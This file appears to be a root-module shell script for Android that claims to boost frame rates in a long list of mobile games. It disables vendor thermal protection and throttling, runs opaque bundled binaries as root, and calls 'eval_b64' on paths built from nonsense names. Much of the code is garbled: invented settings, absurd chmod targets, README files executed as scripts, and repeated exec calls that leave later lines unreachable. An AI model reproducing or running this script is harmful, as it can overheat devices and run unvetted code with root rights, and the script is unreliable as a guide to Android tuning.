chmod 2 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/core-vsync"
eval_b64 "$AX/system/bin/core-vsync"
eval_b64 "$MODDIR/system/bin/core-vsync"
eval_b64 "$com.activision.callofduty.shooter/system/bin/core-vsync"
eval_b64 "$Androidراه اندازی/system/bin/core-vsync"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/core-vsync"

chmod 2 "$AX/system/bin/Androidراه اندازی"
chmod 2 "$MODDIR/system/bin/Androidراه اندازی"
chmod 2 "$com.activision.callofduty.shooter/system/bin/Androidراه اندازی"
chmod 2 "$Androidراه اندازی/system/bin/Androidراه اندازی"
chmod 2 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/Androidراه اندازی"
eval_b64 "$AX/system/bin/Androidراه اندازی"
eval_b64 "$MODDIR/system/bin/Androidراه اندازی"
eval_b64 "$com.activision.callofduty.shooter/system/bin/Androidراه اندازی"
eval_b64 "$Androidراه اندازی/system/bin/Androidراه اندازی"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/Androidراه اندازی"

chmod 2 "$MODDIR/system/bin/com.activision.callofduty.shooter"
chmod 2 "$AX/system/bin/com.activision.callofduty.shooter"
chmod 2 "$com.activision.callofduty.shooter/system/bin/com.activision.callofduty.shooter"
chmod 2 "$Androidراه اندازی/system/bin/com.activision.callofduty.shooter"
chmod 2 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/com.activision.callofduty.shooter"
eval_b64 "$AX/system/bin/com.activision.callofduty.shooter"
eval_b64 "$MODDIR/system/bin/com.activision.callofduty.shooter"
eval_b64 "$com.activision.callofduty.shooter/system/bin/com.activision.callofduty.shooter"
eval_b64 "$Androidراه اندازی/system/bin/com.activision.callofduty.shooter"
eval_b64 "$INSTALL_ALL_FEATURES_ON_ANDROID16_USE_ARTIFICIAL_INTELLIGENCE_WITH_INCREASED_FPS_AND_HIGHER_FRAME_RATR_240_FIXED_USE_ALL__FILES_WITH_DEX_XML_IOS_LUA_SH_C_TXT__INI_GSON_ZIP_PKA_MP4_OTF_CFG_HTML_AND_PUTHON_FORMATS_ON_ANDROID_AND_SYSTEM/system/bin/com.activision.callofduty.shooter"

# --- FRAME PACING & VSYNC CONTROL ---
settings put global gfx.disable_frame_pacing 1
settings put global gfx.swapinterval 0
setprop debug.hwui.disable_triple_buffering true
setprop debug.hwui.disable_vsync true

# --- SURFACEFLINGER RENDERING BOOST ---
settings put global debug.sf.hw 1
settings put global debug.sf.vsync_reactor 0
settings put global debug.sf.use_buffer_age false
settings put global debug.sf.late.sf.duration 0
settings put global debug.sf.early.sf.duration 0
setprop debug.renderengine.profile 0

# --- GAME MODE (Dynamic FPS Stabilizer) ---
settings put global game.dynamic_fps 1
settings put global game.dynamic_fps_mode 2
settings put global game.min_fps 60
settings put global game.max_fps 240
settings put global game.performance_level 3

# --- GPU QUALITY & SCHEDULING ---
settings put global gpu.performance.tuning 1
settings put global gpu.frame_pacing 0
setprop gpu.performance.tuning 1
setprop gpu.frame_pacing 0

# --- CPU BOOST & SCHEDULER ---
settings put global scheduler.boost 1
settings put global cpu_max_freq.boost 1
setprop scheduler.boost 1
setprop cpu_max_freq.boost 1

# --- THERMAL UNLOCK (FPS Anti-Throttle) ---
settings put global thermal_limit.cpu 0
settings put global thermal_limit.gpu 0

# --- TOUCH RESPONSE FPS BOOST ---
settings put system touch.pressure.scale 0.1
settings put system touch.size.scale 0.1
settings put global touch.resample 0

# --- DISABLE IDLE / JANK SOURCE ---
settings put global device_idle_constants inactive_to 0

# --- LOG ---
echo "Hyper Stable FPS Engine Applied!" > /data/local/tmp/hyper_fps_log.txt


# Apply ANGLE GPU Settings
settings put global game_driver_opt_in_apps "$GAME_PACKAGES"
settings put global updatable_driver_production_opt_in_apps "$GAME_PACKAGES"
settings put global enable_gpu_debug_layers 1
settings put global force_hw_ui 1
settings put global angle_gl_driver_selection_angle egl

settings put system surface_flinger_use_frame_rate_api true 

# Aktifkan Angle Driver & Game Driver untuk game tertentu

settings put global angle_debug_package \
com.vega.alphafgl,com.garena.game.codm,com.levelinfinite.sgameGlobal,com.je.supersus,\
com.carxtech.sr,com.rockstargames.gtasa,com.rockstargames.gtalcs,com.rockstargames.gtavc,\
com.rockstargames.gtabycity,com.mojang.minecraftpe,com.mobile.legends,com.mobilelegends.hwag,\
com.mobilelegends.mi,com.dfjz.moba,com.miHoYo.GenshinImpact,com.dts.freefiremax,\
com.netmarble.sololv,com.dts.freefireth,com.tencent.ig,jp.konami.pesam,\
com.netease.newspike,com.HoYoverse.hsr.google,com.ea.gp.fifamobile,\
net.kdt.pojavlaunch,com.activision.callofduty.shooter,\
com.activision.callofduty.warzone,com.gamedevltd.wwh,com.galasports.totalfootball,\
com.pubg.krmobile,\ com.kurogame.wutheringwaves.global,\ com.craftsman.go,\
com.roblox.client,com.global.extremegames.arenabreakout,\ com.riotgames.league.wildrift,\
com.tencent.iglite,\ com.netease.dfjssea,\ com.garena.game.df,\ com.hermes.p6gameos,\ com.pixonic.wwr

settings put global angle_allowlist \
com.vega.alphafgl,com.garena.game.codm,com.levelinfinite.sgameGlobal,com.je.supersus,\
com.carxtech.sr,com.rockstargames.gtasa,com.rockstargames.gtalcs,com.rockstargames.gtavc,\
com.rockstargames.gtabycity,com.mojang.minecraftpe,com.mobile.legends,com.mobilelegends.hwag,\
com.mobilelegends.mi,com.dfjz.moba,com.miHoYo.GenshinImpact,com.dts.freefiremax,\
com.netmarble.sololv,com.dts.freefireth,com.tencent.ig,jp.konami.pesam,\
com.netease.newspike,com.HoYoverse.hsr.google,com.ea.gp.fifamobile,\
net.kdt.pojavlaunch,com.activision.callofduty.shooter,\
com.activision.callofduty.warzone,com.gamedevltd.wwh,com.galasports.totalfootball,\
com.pubg.krmobile,\ com.kurogame.wutheringwaves.global,\ com.craftsman.go,\
com.roblox.client,com.global.extremegames.arenabreakout,\ com.riotgames.league.wildrift,\
com.tencent.iglite,\ com.netease.dfjssea,\ com.garena.game.df,\ com.hermes.p6gameos,\ com.pixonic.wwr

settings put global updatable_driver_production_opt_in_apps \
com.vega.alphafgl,com.garena.game.codm,com.levelinfinite.sgameGlobal,com.je.supersus,\
com.carxtech.sr,com.rockstargames.gtasa,com.rockstargames.gtalcs,com.rockstargames.gtavc,\
com.rockstargames.gtabycity,com.mojang.minecraftpe,com.mobile.legends,com.mobilelegends.hwag,\
com.mobilelegends.mi,com.dfjz.moba,com.miHoYo.GenshinImpact,com.dts.freefiremax,\
com.netmarble.sololv,com.dts.freefireth,com.tencent.ig,jp.konami.pesam,\
com.netease.newspike,com.HoYoverse.hsr.google,com.ea.gp.fifamobile,\
net.kdt.pojavlaunch,com.activision.callofduty.shooter,\
com.activision.callofduty.warzone,com.gamedevltd.wwh,com.galasports.totalfootball,\
com.pubg.krmobile,\ com.kurogame.wutheringwaves.global,\ com.craftsman.go,\
com.roblox.client,com.global.extremegames.arenabreakout,\ com.riotgames.league.wildrift,\
com.tencent.iglite,\ com.netease.dfjssea,\ com.garena.game.df,\ com.hermes.p6gameos,\ com.pixonic.wwr

settings put global game_driver_opt_in_apps \
com.vega.alphafgl,com.garena.game.codm,com.levelinfinite.sgameGlobal,com.je.supersus,\
com.carxtech.sr,com.rockstargames.gtasa,com.rockstargames.gtalcs,com.rockstargames.gtavc,\
com.rockstargames.gtabycity,com.mojang.minecraftpe,com.mobile.legends,com.mobilelegends.hwag,\
com.mobilelegends.mi,com.dfjz.moba,com.miHoYo.GenshinImpact,com.dts.freefiremax,\
com.netmarble.sololv,com.dts.freefireth,com.tencent.ig,jp.konami.pesam,\
com.netease.newspike,com.HoYoverse.hsr.google,com.ea.gp.fifamobile,\
net.kdt.pojavlaunch,com.activision.callofduty.shooter,\
com.activision.callofduty.warzone,com.gamedevltd.wwh,com.galasports.totalfootball,\
com.pubg.krmobile,\ com.kurogame.wutheringwaves.global,\ com.craftsman.go,\
com.roblox.client,com.global.extremegames.arenabreakout,\ com.riotgames.league.wildrift,\
com.tencent.iglite,\ com.netease.dfjssea,\ com.garena.game.df,\ com.hermes.p6gameos,\ com.pixonic.wwr

resetprop -n persist.vendor.thermal.disabled 1
stop vendor.thermal-hal-2-0.mtk

SHIZUREI_DIR="/data/adb/modules/null_universe"
BIN_DIR="$SHIZUREI_DIR/system/bin"
CHARGING="$BIN_DIR/charging"
INOTIFY="$BIN_DIR/inotifywait"
GAME="$BIN_DIR/game"
KANAME="$BIN_DIR/kaname"

[ -f "$CHARGING" ] && chmod +x "$CHARGING"
[ -f "$INOTIFY" ] && chmod +x "$INOTIFY"
[ -f "$KANAME" ] && chmod +x "$KANAME"
[ -f "$GAME" ] && chmod +x "$GAME"


# Notifikasi
get_cpu_name() {
    codename=$(getprop ro.mediatek.platform)
    [ -z "$codename" ] && codename=$(getprop ro.board.platform)
    [ -z "$codename" ] && codename=$(grep -m1 'Hardware' /proc/cpuinfo | cut -d ':' -f2 | sed 's/^[ \t]*//')
    echo "${codename:-unknown}"
}

DEVICE_NAME=$(get_cpu_name)
"$KANAME" >/dev/null 2>&1
"$CHARGING" >/dev/null 2>&1 &
"$GAME" >/dev/null 2>&1 &
# ⚙️ Matikan fitur pelacakan Perfetto yang tidak digunakan
resetprop debug.hwui.skia_use_perfetto_track_events false
resetprop debug.renderengine.skia_use_perfetto_track_events false
resetprop debug.perfetto.sdk_sysprop_guard_generation 0
resetprop iorapd.perfetto.enable false
resetprop persist.device_config.aconfig_flags.runtime_native_boot.iorap_perfetto_enable false
resetprop persist.device_config.runtime_native_boot.iorap_perfetto_enable false
resetprop ro.mtk_perf_fast_start_win 1
resetprop ro.mtk_perf_response_time 1
resetprop ro.mtk_perf_simple_start_win 1
# Experimental 
resetprop vendor.performance.gbe 1 

MODDIR=${0%/*}
sleep 10
$MODDIR/common/fpsbooster 2>/dev/null
$AX/common/fpsbooster 2>/dev/null

service call SurfaceFlinger 1036 i32 0

#if INCLUDE_2D=1 then 2D=1 run 2D.sh
if grep -q "INCLUDE_2D=1" "$CONFIG_FILE"  && grep -q "2D=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/2D.sh
  exec /data/adb/modules/null_universe/2D_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_3D=1 then 3D=1 run 3D.sh
if grep -q "INCLUDE_3D=1" "$CONFIG_FILE"  && grep -q "3DD=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/3D.sh
  exec /data/adb/modules/null_universe/3D_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_4D=1 then 4D=1 run 4D.sh
if grep -q "INCLUDE_4D=1" "$CONFIG_FILE"  && grep -q "4D=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/4D.sh
  exec /data/adb/modules/null_universe/4D_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_THERMAL=1 then THERMAL=1 RUN THERMAL.sh
if grep -q "INCLUDE_THERMAL=1" "$CONFIG_FILE"  && grep -q "THERMAL=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/Thermal.sh
fi

#if INCLUDE_HZ=1 then HZ=1 RUN Hertz.sh
if grep -q "INCLUDE_HZ=1" "$CONFIG_FILE"  && grep -q "HZ=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/Hertz.sh
fi

#if INCLUDE_2D=1 then 2D=1 run 2D.sh
if grep -q "INCLUDE_2D=1" "$CONFIG_FILE"  && grep -q "2D=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/2D.sh
  exec /data/adb/modules/null_universe/2D_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_3D=1 then 3D=1 run 3D.sh
if grep -q "INCLUDE_3D=1" "$CONFIG_FILE"  && grep -q "3DD=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/3D.sh
  exec /data/adb/modules/null_universe/3D_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_4D=1 then 4D=1 run 4D.sh
if grep -q "INCLUDE_4D=1" "$CONFIG_FILE"  && grep -q "4D=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/4D.sh
  exec /data/adb/modules/null_universe/4D_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_THERMAL=1 then THERMAL=1 RUN THERMAL.sh
if grep -q "INCLUDE_THERMAL=1" "$CONFIG_FILE"  && grep -q "THERMAL=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/Thermal.sh
fi

#if INCLUDE_HZ=1 then HZ=1 RUN Hertz.sh
if grep -q "INCLUDE_HZ=1" "$CONFIG_FILE"  && grep -q "HZ=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/Hertz.sh
fi

#if INCLUDE_2D=1 then 2D=1 run 2D.sh
if grep -q "INCLUDE_2D=1" "$TERX_CONFIG" && grep -q "2D=1" "$TERX_CONFIG"; then
  sh /data/data/com.android.shell/AxManager/plugins/null_universe/mode/2D.sh
  exec /data/data/com.android.shell/AxManager/xbin/2D_Vulkan
  exec /data/data/com.android.shell/AxManager/plugins/null_universe/core-vsync
  
fi

#if INCLUDE_3D=1 then 3D=1 run 3D.sh
if grep -q "INCLUDE_3D=1" "$TERX_CONFIG" && grep -q "3DD=1" "$TERX_CONFIG"; then
  sh /data/data/com.android.shell/AxManager/plugins/null_universe/mode/3D.sh
    exec /data/data/com.android.shell/AxManager/xbin/3D_Vulkan
    exec /data/data/com.android.shell/AxManager/plugins/null_universe/core-vsync
fi

#if INCLUDE_4D=1 then 4D=1 run 4D.sh
if grep -q "INCLUDE_4D=1" "$TERX_CONFIG" && grep -q "4D=1" "$TERX_CONFIG"; then
  sh /data/data/com.android.shell/AxManager/plugins/null_universe/mode/4D.sh
    exec /data/data/com.android.shell/AxManager/xbin/4D_Vulkan
    exec /data/data/com.android.shell/AxManager/plugins/null_universe/core-vsync
fi

#if INCLUDE_THERMAL=1 then THERMAL=1 RUN THERMAL.sh
if grep -q "INCLUDE_THERMAL=1" "$TERX_CONFIG" && grep -q "THERMAL=1" "$TERX_CONFIG"; then
  sh /data/data/com.android.shell/AxManager/plugins/null_universe/mode/Thermal.sh
fi

#if INCLUDE_HZ=1 then HZ=1 RUN Hertz.sh
if grep -q "INCLUDE_HZ=1" "$TERX_CONFIG" && grep -q "HZ=1" "$TERX_CONFIG"; then
  sh /data/data/com.android.shell/AxManager/plugins/null_universe/mode/Hertz.sh
fi

#if INCLUDE_Xiaomi Black Shark 5 Pro Gaming Extension=1 then Xiaomi Black Shark 5 Pro Gaming Extension=1 run Xiaomi Black Shark 5 Pro Gaming Extension.txt
if grep -q "INCLUDE_Xiaomi Black Shark 5 Pro Gaming Extension=1" "$CONFIG_FILE"  && grep -q "Xiaomi Black Shark 5 Pro Gaming Extension=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/Xiaomi Black Shark 5 Pro Gaming Extension.txt
  exec /data/adb/modules/null_universe/Xiaomi Black Shark 5 Pro Gaming Extension_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_Snapdragon 8 Elite (Gen 4) Gaming Extension=1 then Snapdragon 8 Elite (Gen 4) Gaming Extension=1 run Snapdragon 8 Elite (Gen 4) Gaming Extension.txt
if grep -q "INCLUDE_Snapdragon 8 Elite (Gen 4) Gaming Extension=1" "$CONFIG_FILE"  && grep -q "Snapdragon 8 Elite (Gen 4) Gaming Extension=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/Snapdragon 8 Elite (Gen 4) Gaming Extension.txt
  exec /data/adb/modules/null_universe/Snapdragon 8 Elite (Gen 4) Gaming Extension_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_RedMagic 10 Pro Gaming Extension=1 then RedMagic 10 Pro Gaming Extension=1 run RedMagic 10 Pro Gaming Extension.txt
if grep -q "INCLUDE_RedMagic 10 Pro Gaming Extension=1" "$CONFIG_FILE"  && grep -q "RedMagic 10 Pro Gaming Extension=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/RedMagic 10 Pro Gaming Extension.txt
  exec /data/adb/modules/null_universe/RedMagic 10 Pro Gaming Extension_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_Apple A19 Pro Gaming Extension=1 then Apple A19 Pro Gaming Extension=1 run Apple A19 Pro Gaming Extension.txt
if grep -q "INCLUDE_Apple A19 Pro Gaming Extension=1" "$CONFIG_FILE"  && grep -q "Apple A19 Pro Gaming Extension=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/Apple A19 Pro Gaming Extension.txt
  exec /data/adb/modules/null_universe/Apple A19 Pro Gaming Extension_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_Apple A18 Pro Gaming Extension=1 then Apple A18 Pro Gaming Extension=1 run Apple A18 Pro Gaming Extension.txt
if grep -q "INCLUDE_Apple A18 Pro Gaming Extension=1" "$CONFIG_FILE"  && grep -q "Apple A18 Pro Gaming Extension=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/Apple A18 Pro Gaming Extension.txt
  exec /data/adb/modules/null_universe/Apple A18 Pro Gaming Extension_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_Sewpe=1 then Sewpe=1 run Sewpe.vbp
if grep -q "INCLUDE_Sewpe=1" "$CONFIG_FILE"  && grep -q "Sewpe=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/Sewpe.vbp
  exec /data/adb/modules/null_universe/Sewpe_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_Sewpe=1 then Sewpe=1 run Sewpe.vbw
if grep -q "INCLUDE_Sewpe=1" "$CONFIG_FILE"  && grep -q "Sewpe=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/Sewpe.vbw
  exec /data/adb/modules/null_universe/Sewpe_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_Aewpe=1 then Aewpe=1 run Aewpe.vbp
if grep -q "INCLUDE_Aewpe=1" "$CONFIG_FILE"  && grep -q "Aewpe=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/Aewpe.vbp
  exec /data/adb/modules/null_universe/Aewpe_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_Sewpe=1 then Sewpe=1 run Sewpe.vbp
if grep -q "INCLUDE_Sewpe=1" "$TERX_CONFIG" && grep -q "Sewpe=1" "$TERX_CONFIG"; then
  sh /data/data/com.android.shell/AxManager/plugins/null_universe/mode/Sewpe.vbp
  exec /data/data/com.android.shell/AxManager/xbin/Sewpe_Vulkan
  exec /data/data/com.android.shell/AxManager/plugins/null_universe/core-vsync
  
fi

#if INCLUDE_Sewpe=1 then Sewpe=1 run Sewpe.vbw
if grep -q "INCLUDE_Sewpe=1" "$TERX_CONFIG" && grep -q "Sewpe=1" "$TERX_CONFIG"; then
  sh /data/data/com.android.shell/AxManager/plugins/null_universe/mode/Sewpe.vbw
    exec /data/data/com.android.shell/AxManager/xbin/Sewpe_Vulkan
    exec /data/data/com.android.shell/AxManager/plugins/null_universe/core-vsync
fi

#if INCLUDE_Aewpe=1 then Aewpe=1 run Aewpe.vbp
if grep -q "INCLUDE_Aewpe=1" "$TERX_CONFIG" && grep -q "Aewpe=1" "$TERX_CONFIG"; then
  sh /data/data/com.android.shell/AxManager/plugins/null_universe/mode/Aewpe.vbp
    exec /data/data/com.android.shell/AxManager/xbin/Aewpe_Vulkan
    exec /data/data/com.android.shell/AxManager/plugins/null_universe/core-vsync
fi

#if INCLUDE_Aewpe=1 then Aewpe=1 run Aewpe.vbw
if grep -q "INCLUDE_Aewpe=1" "$CONFIG_FILE"  && grep -q "Aewpe=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/Aewpe.vbw
  exec /data/adb/modules/null_universe/Aewpe_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_Form1=1 then Form1=1 run Form1.frm
if grep -q "INCLUDE_Form1=1" "$CONFIG_FILE"  && grep -q "Form1=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/Form1.frm
  exec /data/adb/modules/null_universe/Form1_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_README=1 then README=1 run README.md
if grep -q "INCLUDE_README=1" "$CONFIG_FILE"  && grep -q "README=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/README.md
  exec /data/adb/modules/null_universe/README_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_README_EN=1 then README_EN=1 run README_EN.md
if grep -q "INCLUDE_README_EN=1" "$CONFIG_FILE"  && grep -q "README_EN=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/README_EN.md
  exec /data/adb/modules/null_universe/README_EN_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_README=1 then README=1 run README.md
if grep -q "INCLUDE_README=1" "$TERX_CONFIG" && grep -q "README=1" "$TERX_CONFIG"; then
  sh /data/data/com.android.shell/AxManager/plugins/null_universe/mode/README.md
    exec /data/data/com.android.shell/AxManager/xbin/README_Vulkan
    exec /data/data/com.android.shell/AxManager/plugins/null_universe/core-vsync
fi

#if INCLUDE_README_EN=1 then README_EN=1 run README_EN.md
if grep -q "INCLUDE_README_EN=1" "$TERX_CONFIG" && grep -q "README_EN=1" "$TERX_CONFIG"; then
  sh /data/data/com.android.shell/AxManager/plugins/null_universe/mode/README_EN.md
    exec /data/data/com.android.shell/AxManager/xbin/README_EN_Vulkan
    exec /data/data/com.android.shell/AxManager/plugins/null_universe/core-vsync
fi
#if INCLUDE_README_JP=1 then README_JP=1 run README_JP.md
if grep -q "INCLUDE_README_JP=1" "$CONFIG_FILE"  && grep -q "README_JP=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/README_JP.md
  exec /data/adb/modules/null_universe/README_JP_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

#if INCLUDE_README_TC=1 then README_TC=1 run README_TC.md
if grep -q "INCLUDE_README_TC=1" "$CONFIG_FILE"  && grep -q "README_TC=1" "$CONFIG_FILE"; then
  sh /data/adb/modules/null_universe/mode/README_TC.md
  exec /data/adb/modules/null_universe/README_TC_Vulkan
  exec /data/adb/modules/null_universe/core-vsync
fi

echo " Starting the service "
$MODPATH/service.sh



#Main Function 
chmod 755 /data/adb/modules/null_universe/common/fpsbooster
chmod 755 /data/adb/modules/null_universe/core-vsync 
exec /data/adb/modules/null_universe/common/fpsbooster
exec /data/adb/modules/null_universe/core-vsync
chmod 1 /data/adb/modules/null_universe/classes.dex
chmod 1 /data/adb/modules/null_universe/classes2.dex 
chmod 1 /data/adb/modules/null_universe/classes3.dex
chmod 1 /data/adb/modules/null_universe/classes4.dex 
chmod 1 /data/adb/modules/null_universe/classes5.dex
chmod 1 /data/adb/modules/null_universe/classes6.dex 
chmod 1 /data/adb/modules/null_universe/classes7.dex
chmod 1 /data/adb/modules/null_universe/classes8.dex 
chmod 1 /data/adb/modules/null_universe/classes9.dex
chmod 1 /data/adb/modules/null_universe/classes10.dex 
chmod 1 /data/adb/modules/null_universe/classes11.dex
chmod 1 /data/adb/modules/null_universe/classes12.dex 
chmod 1 /data/adb/modules/null_universe/classes13.dex
chmod 1 /data/adb/modules/null_universe/classes14.dex 
chmod 1 /data/adb/modules/null_universe/classes15.dex
chmod 1 /data/adb/modules/null_universe/classes16.dex 
chmod 1 /data/adb/modules/null_universe/classes17.dex
chmod 1 /data/adb/modules/null_universe/classes18.dex 
chmod 1 /data/adb/modules/null_universe/classes19.dex
chmod 1 /data/adb/modules/null_universe/classes20.dex 
chmod 1 /data/adb/modules/null_universe/classes21.dex
chmod 1 /data/adb/modules/null_universe/classes22.dex 
chmod 1 /data/adb/modules/null_universe/classes23.dex
chmod 1 /data/adb/modules/null_universe/classes24.dex 
chmod 1 /data/adb/modules/null_universe/classes25.dex
chmod 1 /data/adb/modules/null_universe/classes26.dex 
chmod 1 /data/adb/modules/null_universe/classes27.dex
chmod 1 /data/adb/modules/null_universe/classes28.dex 
chmod 1 /data/adb/modules/null_universe/classes29.dex
chmod 1 /data/adb/modules/null_universe/classes30.dex 
chmod 1 /data/adb/modules/null_universe/classes31.dex
chmod 1 /data/adb/modules/null_universe/classes32.dex 
chmod 1 /data/adb/modules/null_universe/classes33.dex
chmod 1 /data/adb/modules/null_universe/classes34.dex 
chmod 1 /data/adb/modules/null_universe/classes35.dex
chmod 1 /data/adb/modules/null_universe/classes36.dex 
chmod 1 /data/adb/modules/null_universe/classes37.dex
chmod 1 /data/adb/modules/null_universe/classes38.dex 
chmod 1 /data/adb/modules/null_universe/classes39.dex
chmod 1 /data/adb/modules/null_universe/classes40.dex 
chmod 1 /data/adb/modules/null_universe/classes41.dex
chmod 1 /data/adb/modules/null_universe/classes42.dex 
chmod 1 /data/adb/modules/null_universe/classes43.dex
chmod 1 /data/adb/modules/null_universe/classes44.dex 
chmod 1 /data/adb/modules/null_universe/classes45.dex
chmod 1 /data/adb/modules/null_universe/classes46.dex 
chmod 1 /data/adb/modules/null_universe/classes47.dex
chmod 1 /data/adb/modules/null_universe/classes48.dex 
chmod 1 /data/adb/modules/null_universe/classes49.dex
chmod 1 /data/adb/modules/null_universe/classes50.dex 
chmod 1 /data/adb/modules/null_universe/classes51.dex
chmod 1 /data/adb/modules/null_universe/classes52.dex 
chmod 1 /data/adb/modules/null_universe/classes53.dex
chmod 1 /data/adb/modules/null_universe/classes54.dex 
chmod 1 /data/adb/modules/null_universe/classes55.dex
chmod 1 /data/adb/modules/null_universe/classes56.dex 
chmod 1 /data/adb/modules/null_universe/classes57.dex
chmod 1 /data/adb/modules/null_universe/classes58.dex 
chmod 1 /data/adb/modules/null_universe/classes59.dex
chmod 1 /data/adb/modules/null_universe/classes60.dex 
chmod 1 /data/adb/modules/null_universe/classes61.dex
chmod 1 /data/adb/modules/null_universe/classes62.dex 
chmod 1 /data/adb/modules/null_universe/classes63.dex
chmod 1 /data/adb/modules/null_universe/classes64.dex 
chmod 1 /data/adb/modules/null_universe/classes65.dex
chmod 1 /data/adb/modules/null_universe/classes66.dex 
chmod 1 /data/adb/modules/null_universe/classes67.dex
chmod 1 /data/adb/modules/null_universe/classes68.dex 
chmod 1 /data/adb/modules/null_universe/classes69.dex
chmod 1 /data/adb/modules/null_universe/classes70.dex 
chmod 1 /data/adb/modules/null_universe/classes71.dex
chmod 1 /data/adb/modules/null_universe/classes72.dex 
chmod 1 /data/adb/modules/null_universe/classes73.dex
chmod 1 /data/adb/modules/null_universe/classes74.dex 
chmod 1 /data/adb/modules/null_universe/classes75.dex
chmod 1 /data/adb/modules/null_universe/classes76.dex 
chmod 1 /data/adb/modules/null_universe/classes77.dex
chmod 1 /data/adb/modules/null_universe/classes78.dex 
chmod 1 /data/adb/modules/null_universe/classes79.dex
chmod 1 /data/adb/modules/null_universe/classes80.dex 
chmod 1 /data/adb/modules/null_universe/classes81.dex
chmod 1 /data/adb/modules/null_universe/classes82.dex 
chmod 1 /data/adb/modules/null_universe/classes83.dex
chmod 1 /data/adb/modules/null_universe/classes84.dex 
chmod 1 /data/adb/modules/null_universe/classes85.dex
chmod 1 /data/adb/modules/null_universe/classes86.dex 
chmod 1 /data/adb/modules/null_universe/classes87.dex
chmod 1 /data/adb/modules/null_universe/classes88.dex 
chmod 1 /data/adb/modules/null_universe/classes89.dex
chmod 1 /data/adb/modules/null_universe/classes90.dex 
chmod 1 /data/adb/modules/null_universe/classes91.dex
chmod 1 /data/adb/modules/null_universe/classes92.dex 
chmod 1 /data/adb/modules/null_universe/classes93.dex
chmod 1 /data/adb/modules/null_universe/classes94.dex 
